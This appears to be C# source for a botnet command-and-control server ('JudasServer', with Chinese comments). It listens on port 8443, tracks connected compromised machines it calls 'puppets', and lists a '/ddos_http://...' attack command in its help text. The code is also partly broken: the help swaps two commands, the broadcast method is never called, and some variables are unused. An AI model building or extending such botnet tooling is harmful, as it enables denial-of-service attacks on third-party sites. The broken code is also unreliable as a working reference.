using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
namespace JudasServer;

public class ServerMain
{
    private IPAddress address = IPAddress.IPv6Any;
    private int port = 8443;
    private int buffsize = 512;
    private Socket serverSocket;
    private List<Socket> clientSockets;


    public void Main(string[] args)
    {
        clientSockets = new List<Socket>();

        Thread serverThread = new Thread(Run);
        serverThread.Start();

        Thread cmdThread = new Thread(PostCmd);
        cmdThread.Start();
    }

    // 保持连接
    private void TcpLink(Socket clientSocket)
    {
        int imgCounter = 0;
        while (true)
        {
            try
            {
                byte[] buffer = new byte[buffsize];
                int bytesRead = clientSocket.Receive(buffer);
                string recvData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                Console.WriteLine($"\n {clientSocket.RemoteEndPoint}: {recvData} \n");

                if (bytesRead == 0)
                    break;
            }
            catch
            {
                clientSocket.Close();
                clientSockets.Remove(clientSocket);
                break;
            }
        }

        imgCounter++;
    }

    // 启动socket
    private void Run()
    {
        serverSocket = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp);
        serverSocket.DualMode = true;
        serverSocket.Bind(new IPEndPoint(address, port));
        serverSocket.Listen(5); // 最大排队连接数

        while (true)
        {
            Socket clientSocket = serverSocket.Accept();
            if (!clientSockets.Contains(clientSocket))
                clientSockets.Add(clientSocket);

            Thread thread = new Thread(() => TcpLink(clientSocket));
            thread.Start();
        }
    }

    // 发送指令
    private void Send(string command)
    {
        byte[] data = Encoding.UTF8.GetBytes(command);
        foreach (Socket clientSocket in clientSockets)
        {
            clientSocket.Send(data);
        }
    }

    // 输入指令
    private void PostCmd()
    {
        while (true)
        {
            string command = Console.ReadLine();
            if (command == "/ol")
            {
                Console.WriteLine($"在线{clientSockets.Count}台");
            }
            else if (command == "/ls")
            {
                if (clientSockets.Count < 1)
                {
                    Console.WriteLine("暂无机器在线");
                }
                else
                {
                    foreach (Socket clientSocket in clientSockets)
                    {
                        Console.WriteLine(clientSocket.RemoteEndPoint);
                    }
                }
            }
            else if (command == "/help")
            {
                Console.WriteLine(@"
                    查看傀儡数量 /ls
                    列出傀儡信息 /ol
                    发起攻击指令 /ddos_http://....
                    ");
            }
            else
            {
                Console.WriteLine("未知指令 您可以输入/help接受指引");
            }
        }
    }

}
